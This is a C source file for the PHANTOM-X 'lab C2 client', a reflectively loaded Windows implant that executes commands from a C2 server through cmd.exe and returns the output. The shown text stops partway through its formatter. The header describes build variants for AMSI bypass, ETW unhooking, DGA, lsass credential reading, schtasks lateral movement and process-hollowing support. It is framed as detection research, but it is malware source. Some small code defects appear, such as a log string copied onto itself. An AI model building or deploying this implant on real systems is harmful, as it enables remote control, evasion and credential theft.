/*
 * PHANTOM-X :: phase3_fileless/loader/px_payload.c
 * =============================================================================
 * px_payload.exe -- lab C2 client, built as a REFLECTIVE-LOADABLE PE.
 *
 * WHAT IT DOES
 *   1. Writes a marker file recording that it executed (evidence for the lab).
 *   2. Connects to the lab C2 server over TCP.
 *   3. Sends HELLO with arch / pid / hostname.
 *   4. Enters a command loop: answers PING, executes EXEC commands via
 *      cmd.exe with stdout+stderr captured, returns the output.
 *   5. Exits cleanly on EXIT.
 *
 * WHY THIS FILE HAS NO C RUNTIME
 *   The payload is executed by px_loader.exe, which maps the PE image by
 *   hand: headers, sections, relocations, imports. It does NOT register the
 *   image with the Windows loader, so the loader never assigns this module
 *   a thread-local-storage index.
 *
 *   A normally built MinGW executable cannot run that way. Its CRT startup
 *   (mainCRTStartup) reaches module TLS state that was never initialised,
 *   and the process faults immediately. This was observed, not assumed:
 *   the mapped image crashed inside the CRT entry point with a read from a
 *   wild TLS-derived address.
 *
 *   The fix is to remove the dependency rather than to fake loader state.
 *   This translation unit is built with -nostdlib and a custom entry point,
 *   and it uses only Win32 APIs plus its own string and memory helpers.
 *   Nothing in here needs a TLS index, a CRT, or an initialised heap.
 *
 * SCOPE AND VARIANTS
 *   A laboratory instrument for a personally owned, isolated Windows VM.
 *
 *   The BASELINE build is plain: no obfuscation, no packing, no
 *   encryption, no AMSI bypass, no ETW unhooking, no domain generation,
 *   no credential access, no lateral movement. The payload is observable
 *   by Defender and Sysmon, which is what makes it the comparison arm.
 *
 *   The VARIANT builds add one capability each. They exist to answer
 *   questions, not to be impressive:
 *
 *     obfuscated    how much detection depends on a plaintext string?
 *     AMSI bypass   does script scanning contribute to fileless detection?
 *     ETW unhook    which detections only work because ETW is intact?
 *     encrypted     which network detections are plaintext-signature based?
 *     DGA           which C2 detections depend on a fixed address?
 *     credential    what does credential access look like in telemetry?
 *     lateral       what does movement look like on the TARGET host?
 *
 *   Every variant is measured against the baseline. The difference in
 *   the telemetry IS the result, and it is a result about the DETECTION
 *   rather than about the payload. A rule that stops firing when the
 *   string is encoded was a rule that was riding on the string.
 *
 *   The variant capabilities are compiled in or out at BUILD time, not
 *   switched at runtime. A capability that is not compiled in cannot be
 *   detected, and "present but disabled" is not the same thing as
 *   "not present".
 *
 *   Two capabilities are about SCOPE rather than visibility, and both are
 *   deliberately bounded in ways that matter:
 *
 *     credential access  collects from the lab VM and reports a REDACTED
 *                        summary. The secret material does not go on the
 *                        wire: a reachable C2 server would publish it.
 *                        See px_cred.c for the reasoning.
 *
 *     lateral movement   moves to ONE explicitly named host, supplied by
 *                        the operator. No scanning, no target list, no
 *                        propagation. An instrument moves where it is
 *                        told to move, and the fact that it had to be
 *                        told is visible in the audit log.
 *
 * PROTOCOL (line oriented, UTF-8)
 *   client -> server   HELLO|<arch>|<pid>|<hostname>
 *                      CAPS|<mask>
 *                      PONG
 *                      RESULT|<cmd_id>|<base64 output>|<exit_code>
 *   server -> client   PING
 *                      EXEC|<cmd_id>|<command line>
 *                      CRED|<cmd_id>
 *                      LATERAL|<cmd_id>|<host>
 *                      EXIT
 *
 * BUILD (MinGW x64):
 *   x86_64-w64-mingw32-gcc -O2 -Wall -nostdlib -ffreestanding -fno-builtin \
 *       -Wl,--entry=px_entry -o px_payload.exe px_payload.c -lkernel32
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stddef.h>
#include <stdint.h>

/* The build-time variant configuration. Every capability is OFF by
 * default, so the baseline build is the plain one. */
#include "px_config.h"

/* The variant interface is needed early: it declares the helpers that
 * the variant files call, and the variant files themselves are included
 * further down, after the payload's own freestanding helpers are
 * defined. */
#include "px_variant.h"

/* ------------------------------------------------------------------------ */
/* Portable variadic-argument support.                                       */
/*                                                                            */
/* The formatter below is freestanding: it cannot use <stdarg.h> because     */
/* that header is a CRT header and this file is built with /NODEFAULTLIB    */
/* (MSVC) or -nostdlib (MinGW). It has no CRT to ask for a va_list.          */
/*                                                                            */
/* GCC and Clang expose __builtin_va_list and friends. MSVC does not: it    */
/* has __va_list / __builtin_va_start / __builtin_va_arg / __builtin_va_end */
/* under different names. The original code used the GCC spellings only,    */
/* which meant build_lab.ps1 -- the documented MSVC build path -- had never  */
/* actually been run against this file. These macros make both compilers    */
/* work.                                                                     */
/*                                                                            */
/* MSVC's __builtin_va_arg takes an extra type argument, which the GCC one */
/* does not, so the argument-fetch macro differs between the two.           */
/* ------------------------------------------------------------------------ */
#if defined(_MSC_VER)
/* MSVC spells the type __va_list. Its va_start/va_arg/va_end are reached
 * through <stdarg.h>, which is a compiler header and not a CRT library, so
 * it is safe to include even with /NODEFAULTLIB.
 *
 * MSVC's va_list is a pointer, GCC's is an array type. Passing a va_list
 * to a helper function therefore differs between the two, so the core
 * formatter takes a POINTER to the va_list and the wrappers pass
 * &ap. That works on both: on MSVC ap is a char*, on GCC it is a
 * one-element array, and in both cases *ap is what va_arg expects. */
#include <stdarg.h>
typedef va_list px_va_list;
#define PX_VA_START(ap, last) va_start(ap, last)
#define PX_VA_END(ap)         va_end(ap)
#define PX_VA_ARG(ap, type)   va_arg(ap, type)
#else
typedef __builtin_va_list px_va_list;
#define PX_VA_START(ap, last) __builtin_va_start(ap, last)
#define PX_VA_END(ap)         __builtin_va_end(ap)
#define PX_VA_ARG(ap, type)   __builtin_va_arg(ap, type)
#endif
/* Winsock is resolved AT RUNTIME via LoadLibraryA/GetProcAddress so that the
 * static import table contains KERNEL32.dll only.
 *
 * Why that matters: for process hollowing the loader must write resolved
 * import addresses into the TARGET process's IAT. It can only do that for
 * modules the target already has loaded. Every Windows process has
 * kernel32.dll; most do NOT have ws2_32.dll. Resolving Winsock at runtime
 * keeps the static import surface to the one module that is always present.
 * The payload loads ws2_32.dll itself once it is running. */
typedef UINT_PTR PX_SOCKET;
typedef struct px_sockaddr_in {
    short sin_family;
    unsigned short sin_port;
    unsigned long sin_addr;
    char sin_zero[8];
} PX_SOCKADDR_IN;

#define PX_INVALID_SOCKET ((PX_SOCKET)~0)
#define PX_SOCK_STREAM 1
#define PX_AF_INET 2
#define PX_SOMAXCONN 0x7fffffff
#ifndef PX_WSAAPI
#define PX_WSAAPI __stdcall
#endif

typedef int (PX_WSAAPI *fn_wsastartup)(unsigned short, void *);
typedef int (PX_WSAAPI *fn_wsacleanup)(void);
typedef PX_SOCKET (PX_WSAAPI *fn_socket)(int, int, int);
typedef int (PX_WSAAPI *fn_connect)(PX_SOCKET, const PX_SOCKADDR_IN *, int);
typedef int (PX_WSAAPI *fn_send)(PX_SOCKET, const char *, int, int);
typedef int (PX_WSAAPI *fn_recv)(PX_SOCKET, char *, int, int);
typedef int (PX_WSAAPI *fn_closesocket)(PX_SOCKET);
typedef unsigned long (PX_WSAAPI *fn_inet_addr)(const char *);
typedef unsigned short (PX_WSAAPI *fn_htons)(unsigned short);
typedef int (PX_WSAAPI *fn_getlasterror)(void);

/* gethostbyname and inet_addr are declared in px_variant.h, because the
 * endpoint resolution code needs them and that is a separate
 * translation unit. The hostent layout is the Winsock one; only the
 * fields that are actually read are declared. */

/* WSADATA is filled in by WSAStartup; it must be a valid buffer, not NULL.
 * Layout mirrors wincrypt/winsock: version fields, limits, then the two
 * 256/128 byte description strings. */
typedef struct px_wsadata {
    unsigned short wVersion;
    unsigned short wHighVersion;
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char *lpVendorInfo;
    char szDescription[257];
    char szSystemStatus[129];
} PX_WSADATA;

/* GetProcAddress returns FARPROC; casting it to a specific signature is the
 * documented usage, but GCC warns about it. Route through a void* helper so
 * the intent is explicit and the build stays warning-free. */
static void *px_proc(HMODULE h, const char *name)
{
    return (void *)GetProcAddress(h, name);
}

/* ================================================================== */
/* freestanding runtime helpers                                       */
/* ================================================================== */
/* NOTE: size_t comes from <stddef.h>. On Win64 'unsigned long' is still
 * 32-bit (LLP64), so it must never be used for a length or a pointer. */
#ifndef PX_SIZE_T_DEFINED
#define PX_SIZE_T_DEFINED
typedef size_t px_size_t;
#endif

/* MSVC treats memcpy/memset/memmove as intrinsics and refuses to let them
 * be defined ("C2169: intrinsic function, cannot be defined"). The
 * freestanding copies below are what this payload actually runs, so on MSVC
 * the intrinsic versions are renamed out of the way first and the local
 * definitions take their place.
 *
 * MinGW has no such conflict: there the local definitions are used
 * directly. */
#if defined(_MSC_VER)
#pragma function(memcpy, memset, memmove)
#endif

void *memcpy(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--)
        *d++ = *s++;
    return dst;
}

void *memset(void *dst, int c, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    while (n--)
        *d++ = (unsigned char)c;
    return dst;
}

void *memmove(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    if (d == s || n == 0)
        return dst;
    if (d < s) {
        while (n--)
            *d++ = *s++;
    } else {
        d += n;
        s += n;
        while (n--)
            *--d = *--s;
    }
    return dst;
}

static px_size_t px_strlen(const char *s)
{
    px_size_t n = 0;
    while (s[n])
        n++;
    return n;
}

/* The variant implementations.
 *
 * Each file compiles to a no-op when its capability is disabled, so the
 * payload links identically either way. They are included here, rather
 * than at the top of the file, because they use the payload's own
 * freestanding helpers and those have to exist first.
 *
 * The order matters: px_obfuscate.c defines the decoder that the others
 * call. */
#include "px_obfuscate.c"
#include "px_amsi.c"
#include "px_etw.c"
#include "px_crypt.c"
#include "px_dga.c"
#include "px_cred.c"
#include "px_lateral.c"

/* Copy a string with a bound.
 *
 * Defined here, before the vocabulary initialiser that uses it. The
 * payload has no CRT, so strcpy is not available and strncpy does not
 * terminate on truncation. */
static px_size_t px_strcpy(char *dst, const char *src, px_size_t cap)
{
    px_size_t i = 0;
    while (src[i] && i + 1 < cap) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

/* Concatenate, with a bound. Returns the new length. */
px_size_t px_strcat(char *dst, const char *src, px_size_t cap)
{
    px_size_t d = px_strlen(dst);
    px_size_t s = 0;
    while (src[s] && d + 1 < cap) {
        dst[d++] = src[s++];
    }
    dst[d] = '\0';
    return d;
}

/* Case-insensitive substring search. Returns a pointer to the match, or
 * NULL. */
const char *px_strstr_ci(const char *hay, const char *needle)
{
    px_size_t nl = px_strlen(needle);
    if (!nl)
        return hay;
    for (; *hay; hay++) {
        px_size_t i;
        for (i = 0; i < nl; i++) {
            char a = hay[i];
            char b = needle[i];
            if (a >= 'A' && a <= 'Z')
                a = (char)(a - 'A' + 'a');
            if (b >= 'A' && b <= 'Z')
                b = (char)(b - 'A' + 'a');
            if (a != b)
                break;
        }
        if (i == nl)
            return hay;
    }
    return NULL;
}

/* ================================================================== */
/* The protocol vocabulary                                              */
/* ================================================================== */
/*                                                                        */
/* The protocol keywords are sensitive strings too: a defender who      */
/* greps a capture for "HELLO|" or "RESULT|" identifies the lab C2     */
/* without needing the payload at all.                                  */
/*                                                                        */
/* So in the obfuscated build they come out of the table. In the        */
/* baseline build they are the plain literals, because that is the      */
/* comparison arm and it has to stay exactly what it was.                */
/*                                                                        */
/* The table below is filled once, at startup, and the dispatch uses   */
/* it. The lengths are fixed so the compiler can size the buffers.     */
/* ================================================================== */
#if PX_OBFUSCATE
#define PX_VOCAB_DECODE(id, buf) px_obf_decode((id), (buf), (unsigned int)sizeof(buf))
#else
#define PX_VOCAB_DECODE(id, buf) (0)
#endif

typedef struct px_vocab {
    char hello[16];
    char caps[16];
    char result[16];
    char exec[16];
    char ping[8];
    char pong[8];
    char exit[8];
    char cred[8];
    char lateral[16];
    /* the module and environment names */
    char ws2_32[24];
    char env_c2_host[24];
    char env_c2_port[24];
    char env_trace[24];
    /* the format strings */
    char f_hello[32];
    char f_caps[16];
    char f_result[32];
    char f_exec[32];
    char f_marker[128];
    char f_dga[32];
    char f_cred_prefix[32];
    char f_lateral_prefix[32];
    char f_lateral_rpt[96];
    char f_cred_rpt[80];
    char f_cred_blocks[48];
    char f_no_resolve[32];
    char txt_no_cred_data[64];
    /* the log messages */
    char log_exit[48];
    char log_exec[48];
    char log_amsi_ok[48];
    char log_amsi_fail[96];
    char log_etw_ok[48];
    char log_etw_fail[48];
    char log_enc_on[48];
    char log_enc_off[64];
    char log_dga[48];
    char log_cred[48];
    char log_lateral[48];
    char log_frame_bad[48];
    char log_no_resolve[48];
    char log_closed[48];
    char log_large[64];
    char log_ws_fail[64];
    char log_ws_exports[48];
    char log_wsa_fail[48];
    char log_sock_fail[48];
    char log_connecting[48];
    char log_conn_fail[48];
    char log_connected[32];
    char log_frame_len[48];
    char log_finished[32];
    char log_enc_state[48];
    char log_backoff[64];
    char log_reconnect[64];
    char log_transfer[64];
    char download[8];
    char cap_cmd[8];
    char log_cap[64];
    char screenshot[8];
} px_vocab;

static px_vocab g_vocab;

/* Fill the vocabulary.
 *
 * In the baseline build the plain literals are used, because the
 * obfuscation variant is not compiled in and the strings have to be
 * visible for the comparison to mean anything. */
static void px_vocab_init(void)
{
#if PX_OBFUSCATE
    PX_VOCAB_DECODE(PX_SID_PROTO_HELLO, g_vocab.hello);
    PX_VOCAB_DECODE(PX_SID_PROTO_CAPS, g_vocab.caps);
    PX_VOCAB_DECODE(PX_SID_PROTO_RESULT, g_vocab.result);
    PX_VOCAB_DECODE(PX_SID_PROTO_EXEC, g_vocab.exec);
    PX_VOCAB_DECODE(PX_SID_PROTO_REACH, g_vocab.ping);
    PX_VOCAB_DECODE(PX_SID_PROTO_ANSWER, g_vocab.pong);
    PX_VOCAB_DECODE(PX_SID_PROTO_STOP, g_vocab.exit);
    PX_VOCAB_DECODE(PX_SID_PROTO_CRED, g_vocab.cred);
    PX_VOCAB_DECODE(PX_SID_PROTO_LATERAL, g_vocab.lateral);
    PX_VOCAB_DECODE(PX_SID_WS2_32, g_vocab.ws2_32);
    PX_VOCAB_DECODE(PX_SID_ENV_C2_HOST, g_vocab.env_c2_host);
    PX_VOCAB_DECODE(PX_SID_ENV_C2_PORT, g_vocab.env_c2_port);
    PX_VOCAB_DECODE(PX_SID_ENV_TRACE, g_vocab.env_trace);
    PX_VOCAB_DECODE(PX_SID_TXT_HELLO_FMT, g_vocab.f_hello);
    PX_VOCAB_DECODE(PX_SID_TXT_CAPS_FMT, g_vocab.f_caps);
    PX_VOCAB_DECODE(PX_SID_TXT_RESULT_FMT, g_vocab.f_result);
    PX_VOCAB_DECODE(PX_SID_TXT_EXEC_FMT, g_vocab.f_exec);
    PX_VOCAB_DECODE(PX_SID_TXT_MARKER_FMT, g_vocab.f_marker);
    PX_VOCAB_DECODE(PX_SID_TXT_DGA_HOST, g_vocab.f_dga);
    PX_VOCAB_DECODE(PX_SID_TXT_CRED_PREFIX, g_vocab.f_cred_prefix);
    PX_VOCAB_DECODE(PX_SID_TXT_LATERAL_PREFIX, g_vocab.f_lateral_prefix);
    PX_VOCAB_DECODE(PX_SID_TXT_LATERAL_RPT, g_vocab.f_lateral_rpt);
    PX_VOCAB_DECODE(PX_SID_TXT_CRED_RPT, g_vocab.f_cred_rpt);
    PX_VOCAB_DECODE(PX_SID_TXT_CRED_BLOCKS, g_vocab.f_cred_blocks);
    PX_VOCAB_DECODE(PX_SID_TXT_NO_RESOLVE, g_vocab.f_no_resolve);
    PX_VOCAB_DECODE(PX_SID_TXT_NO_CRED_DATA, g_vocab.txt_no_cred_data);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_EXIT, g_vocab.log_exit);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_EXEC, g_vocab.log_exec);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_AMSI_OK, g_vocab.log_amsi_ok);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_AMSI_FAIL, g_vocab.log_amsi_fail);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_ETW_OK, g_vocab.log_etw_ok);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_ETW_FAIL, g_vocab.log_etw_fail);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_ENC_ON, g_vocab.log_enc_on);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_ENC_OFF, g_vocab.log_enc_off);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_DGA, g_vocab.log_dga);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_CRED, g_vocab.log_cred);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_LATERAL, g_vocab.log_lateral);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_FRAME_BAD, g_vocab.log_frame_bad);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_NO_RESOLVE, g_vocab.log_no_resolve);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_CLOSED, g_vocab.log_closed);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_LARGE, g_vocab.log_large);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_WS_FAIL, g_vocab.log_ws_fail);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_WS_EXPORTS, g_vocab.log_ws_exports);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_WSA_FAIL, g_vocab.log_wsa_fail);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_SOCK_FAIL, g_vocab.log_sock_fail);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_CONNECTING, g_vocab.log_connecting);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_CONN_FAIL, g_vocab.log_conn_fail);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_CONNECTED, g_vocab.log_connected);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_FRAME_LEN, g_vocab.log_frame_len);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_FINISHED, g_vocab.log_finished);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_ENC_STATE, g_vocab.log_enc_state);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_BACKOFF, g_vocab.log_backoff);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_RECONNECT, g_vocab.log_reconnect);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_TRANSFER, g_vocab.log_transfer);
    PX_VOCAB_DECODE(PX_SID_PROTO_DOWNLOAD, g_vocab.download);
    PX_VOCAB_DECODE(PX_SID_PROTO_CAP, g_vocab.cap_cmd);
    PX_VOCAB_DECODE(PX_SID_TXT_LOG_CAP, g_vocab.log_cap);
    PX_VOCAB_DECODE(PX_SID_PROTO_SCREENSHOT, g_vocab.screenshot);
#else
    px_strcpy(g_vocab.hello, "HELLO|", sizeof(g_vocab.hello));
    px_strcpy(g_vocab.caps, "CAPS|", sizeof(g_vocab.caps));
    px_strcpy(g_vocab.result, "RESULT|", sizeof(g_vocab.result));
    px_strcpy(g_vocab.exec, "EXEC|", sizeof(g_vocab.exec));
    px_strcpy(g_vocab.ping, "PING", sizeof(g_vocab.ping));
    px_strcpy(g_vocab.pong, "PONG", sizeof(g_vocab.pong));
    px_strcpy(g_vocab.exit, "EXIT", sizeof(g_vocab.exit));
    px_strcpy(g_vocab.cred, "CRED|", sizeof(g_vocab.cred));
    px_strcpy(g_vocab.lateral, "LATERAL|", sizeof(g_vocab.lateral));
    px_strcpy(g_vocab.ws2_32, "ws2_32.dll", sizeof(g_vocab.ws2_32));
    px_strcpy(g_vocab.env_c2_host, "PX_C2_HOST", sizeof(g_vocab.env_c2_host));
    px_strcpy(g_vocab.env_c2_port, "PX_C2_PORT", sizeof(g_vocab.env_c2_port));
    px_strcpy(g_vocab.env_trace, "PX_TRACE", sizeof(g_vocab.env_trace));
    px_strcpy(g_vocab.f_hello, "HELLO|%s|%lu|%s", sizeof(g_vocab.f_hello));
    px_strcpy(g_vocab.f_caps, "CAPS|%lu", sizeof(g_vocab.f_caps));
    px_strcpy(g_vocab.f_result, "RESULT|%s|%s|%ld", sizeof(g_vocab.f_result));
    px_strcpy(g_vocab.f_exec, "EXEC %s : %s\n", sizeof(g_vocab.f_exec));
    px_strcpy(g_vocab.f_marker,
              "px_payload executed\r\n  pid  : %lu\r\n  host : %s\r\n"
              "  time : %04lu-%02lu-%02lu %02lu:%02lu:%02lu\r\n",
              sizeof(g_vocab.f_marker));
    px_strcpy(g_vocab.f_dga, "DGA host: %s\n", sizeof(g_vocab.f_dga));
    px_strcpy(g_vocab.f_cred_prefix, "CRED %s : %s\n",
              sizeof(g_vocab.f_cred_prefix));
    px_strcpy(g_vocab.f_lateral_prefix, "LATERAL %s : %s\n",
              sizeof(g_vocab.f_lateral_prefix));
    px_strcpy(g_vocab.f_lateral_rpt, "lateral to %s via schtasks: rc=%ld %s",
              sizeof(g_vocab.f_lateral_rpt));
    px_strcpy(g_vocab.f_cred_rpt,
              "lsass pid=%d window=0x%llx read=%lu bytes ",
              sizeof(g_vocab.f_cred_rpt));
    px_strcpy(g_vocab.f_cred_blocks, "cred_blocks=%d sample=%s",
              sizeof(g_vocab.f_cred_blocks));
    px_strcpy(g_vocab.f_no_resolve, "cannot resolve %s\n",
              sizeof(g_vocab.f_no_resolve));
    px_strcpy(g_vocab.txt_no_cred_data, "credential collection returned no data",
              sizeof(g_vocab.txt_no_cred_data));
    px_strcpy(g_vocab.log_exit, "[px] EXIT received\n", sizeof(g_vocab.log_exit));
    px_strcpy(g_vocab.log_exec, "[px] EXEC %s : %s\n", sizeof(g_vocab.log_exec));
    px_strcpy(g_vocab.log_amsi_ok, "[px] AMSI bypass applied\n",
              sizeof(g_vocab.log_amsi_ok));
    px_strcpy(g_vocab.log_amsi_fail,
              g_vocab.log_amsi_fail,
              sizeof(g_vocab.log_amsi_fail));
    px_strcpy(g_vocab.log_etw_ok, "[px] ETW unhooked\n", sizeof(g_vocab.log_etw_ok));
    px_strcpy(g_vocab.log_etw_fail, "[px] ETW unhook failed\n",
              sizeof(g_vocab.log_etw_fail));
    px_strcpy(g_vocab.log_enc_on, "[px] channel encryption enabled\n",
              sizeof(g_vocab.log_enc_on));
    px_strcpy(g_vocab.log_enc_off, "[px] channel encryption unavailable (no key)\n",
              sizeof(g_vocab.log_enc_off));
    px_strcpy(g_vocab.log_dga, "[px] DGA host: %s\n", sizeof(g_vocab.log_dga));
    px_strcpy(g_vocab.log_cred, "[px] CRED %s : %s\n", sizeof(g_vocab.log_cred));
    px_strcpy(g_vocab.log_lateral, "[px] LATERAL %s : %s\n",
              sizeof(g_vocab.log_lateral));
    px_strcpy(g_vocab.log_frame_bad, "[px] frame failed to decode\n",
              sizeof(g_vocab.log_frame_bad));
    px_strcpy(g_vocab.log_no_resolve, "[px] cannot resolve %s\n",
              sizeof(g_vocab.log_no_resolve));
    px_strcpy(g_vocab.log_closed, "[px] connection closed by peer\n",
              sizeof(g_vocab.log_closed));
    px_strcpy(g_vocab.log_large, "[px] encrypted frame too large, sending clear\n",
              sizeof(g_vocab.log_large));
    px_strcpy(g_vocab.log_ws_fail, "[px] LoadLibrary ws2_32 failed (%lu)\n",
              sizeof(g_vocab.log_ws_fail));
    px_strcpy(g_vocab.log_ws_exports, "[px] ws2_32 exports missing\n",
              sizeof(g_vocab.log_ws_exports));
    px_strcpy(g_vocab.log_wsa_fail, "[px] WSAStartup failed\n",
              sizeof(g_vocab.log_wsa_fail));
    px_strcpy(g_vocab.log_sock_fail, "[px] socket failed (%lu)\n",
              sizeof(g_vocab.log_sock_fail));
    px_strcpy(g_vocab.log_connecting, "[px] connecting to %s:%d\n",
              sizeof(g_vocab.log_connecting));
    px_strcpy(g_vocab.log_conn_fail, "[px] connect failed (%lu)\n",
              sizeof(g_vocab.log_conn_fail));
    px_strcpy(g_vocab.log_connected, "[px] connected\n",
              sizeof(g_vocab.log_connected));
    px_strcpy(g_vocab.log_frame_len, "[px] bad frame length %lu\n",
              sizeof(g_vocab.log_frame_len));
    px_strcpy(g_vocab.log_finished, "[px] finished\n",
              sizeof(g_vocab.log_finished));
    px_strcpy(g_vocab.log_enc_state, "[px] channel encryption %s\n",
              sizeof(g_vocab.log_enc_state));
    px_strcpy(g_vocab.log_backoff, "[px] reconnecting in %lu seconds\n",
              sizeof(g_vocab.log_backoff));
    px_strcpy(g_vocab.log_reconnect, "[px] session ended, reconnecting\n",
              sizeof(g_vocab.log_reconnect));
#endif
}

/* Case-insensitive compare. The payload links no CRT, so strcmp and
 * strcasecmp are not available. */
int px_stricmp(const char *a, const char *b)
{
    while (*a && *b) {
        unsigned char ca = (unsigned char)*a;
        unsigned char cb = (unsigned char)*b;
        if (ca >= 'A' && ca <= 'Z')
            ca = (unsigned char)(ca - 'A' + 'a');
        if (cb >= 'A' && cb <= 'Z')
            cb = (unsigned char)(cb - 'A' + 'a');
        if (ca != cb)
            return (int)ca - (int)cb;
        a++;
        b++;
    }
    return (int)(unsigned char)*a - (int)(unsigned char)*b;
}

/* A bounded snprintf that always terminates.
 *
 * Defined AFTER px_vfmt_va, which it uses. The forward declaration
 * below is what makes the ordering explicit. */
unsigned int px_snprintf(char *out, unsigned int cap, const char *fmt, ...);

static int px_strncmp(const char *a, const char *b, px_size_t n)
{
    while (n--) {
        if (*a != *b)
            return (unsigned char)*a - (unsigned char)*b;
        if (!*a)
            return 0;
        a++;
        b++;
    }
    return 0;
}

/* Find the LAST occurrence of a character.
 *
 * This is strrchr, not strchr. The difference matters: the image path is
 * "C:\dir\file.exe", and the directory is everything up to the LAST
 * backslash. The original code used the FIRST match, which cut the path
 * at "C:" and produced "C:\px_payload_running.txt" instead of
 * "<dir>\px_payload_running.txt".
 *
 * The symptom was subtle: the marker file was still written, but to the
 * root of the drive rather than next to the image, so the lab operator
 * looking for it beside the payload never found it.
 */
static char *px_strrchr(const char *s, int c)
{
    const char *last = NULL;
    for (; *s; s++) {
        if (*s == (char)c)
            last = s;
    }
    return (char *)last;
}

static char *px_strchr(const char *s, int c)
{
    for (; *s; s++) {
        if (*s == (char)c)
            return (char *)s;
    }
    return NULL;
}

/* ================================================================== */
/* tiny formatting + logging (no CRT)                                 */
/* ================================================================== */
/* Build "<dir of the running image>\<name>" and return it. */
static void px_path_next_to_image(char *out, px_size_t cap, const char *name)
{
    char dir[MAX_PATH];
    px_size_t l;
    if (!GetModuleFileNameA(NULL, dir, MAX_PATH)) {
        px_strcpy(dir, ".", MAX_PATH);
    } else {
        char *slash = px_strrchr(dir, '\\');
        if (slash)
            *slash = '\0';
        else
            px_strcpy(dir, ".", MAX_PATH);
    }
    l = px_strcpy(out, dir, cap);
    if (l + 1 < cap) {
        out[l] = '\\';
        out[l + 1] = '\0';
        px_strcpy(out + l + 1, name, cap - (l + 1));
    }
}

static void px_emit(const char *buf, px_size_t len)
{
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written = 0;

    /* stdout, when there is one */
    if (h != INVALID_HANDLE_VALUE && h != NULL)
        WriteFile(h, buf, (DWORD)len, &written, NULL);

    /* A hollowed process is a GUI process with no console, so stdout may
     * be absent. Always mirror the log to a file next to the image so the
     * run is observable no matter what the host process is. */
    {
        char path[MAX_PATH];
        HANDLE f;
        px_path_next_to_image(path, MAX_PATH, "px_payload_log.txt");
        f = CreateFileA(path, FILE_APPEND_DATA,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            WriteFile(f, buf, (DWORD)len, &written, NULL);
            CloseHandle(f);
        }
    }
}

static px_size_t px_utoa(unsigned long v, char *out)
{
    char tmp[24];
    int n = 0, i;
    if (v == 0) {
        out[0] = '0';
        out[1] = '\0';
        return 1;
    }
    while (v) {
        tmp[n++] = (char)('0' + (v % 10));
        v /= 10;
    }
    for (i = 0; i < n; i++)
        out[i] = tmp[n - 1 - i];
    out[n] = '\0';
    return (px_size_t)n;
}

/* 64-bit decimal. The payload is built for x64 as well as x86, and the
 * freestanding build has no CRT to fall back on, so the conversion is
 * written out by hand here. */
static px_size_t px_utoa64(unsigned long long v, char *out)
{
    char tmp[24];
    int n = 0, i;
    if (v == 0) {
        out[0] = '0';
        out[1] = '\0';
        return 1;
    }
    while (v) {
        tmp[n++] = (char)('0' + (int)(v % 10));
        v /= 10;
    }
    for (i = 0; i < n; i++)
        out[i] = tmp[n - 1 - i];
    out[n] = '\0';
    return (px_size_t)n;
}

/* Format into a caller buffer.
 *
 * Supported conversions: %s %d %i %u %x %X %p %%
 * Length modifiers: l, ll, z (and the h variants).
 * Flags: '0' zero padding, '-' left justify.
 * Width: any decimal number.
 *
 * NOTE (bugfix, 2026-11): the previous version supported only the bare
 * %s %d %u %x %p conversions. Two call sites were therefore silently
 * wrong:
 *
 *   - "%ld" was not recognised, so the RESULT line carried the literal
 *     text "%ld" where the exit code should have been. The C2 server
 *     received "exit_code=%ld" and could not tell a failure from a
 *     success. Nothing complained: the value was a non-empty string.
 *
 *   - "%04u" style zero padding was not implemented, so the timestamp
 *     written to the marker file came out unpadded ("202611110940" for
 *     "%04u-%02u-%02u %02u:%02u:%02u").
 *
 * The argument type is now derived from the conversion AND the length
 * modifier, so "%ld" reads a long, "%lld" reads a long long and "%zu"
 * reads a size_t. Signed conversions use a separate path so that a
 * negative number prints with its sign.
 */
static px_size_t px_vfmt_va(char *out, px_size_t cap, const char *fmt,
                            px_va_list ap)
{
    px_size_t o = 0;
    while (*fmt && o + 1 < cap) {
        int width = 0;
        int zero_pad = 0;
        int left_justify = 0;
        int longness = 0;   /* 0 = int, 1 = long, 2 = long long, 3 = size_t */
        char conv;

        if (*fmt != '%') {
            out[o++] = *fmt++;
            continue;
        }
        fmt++;

        /* flags */
        for (;;) {
            if (*fmt == '0') {
                zero_pad = 1;
                fmt++;
                continue;
            }
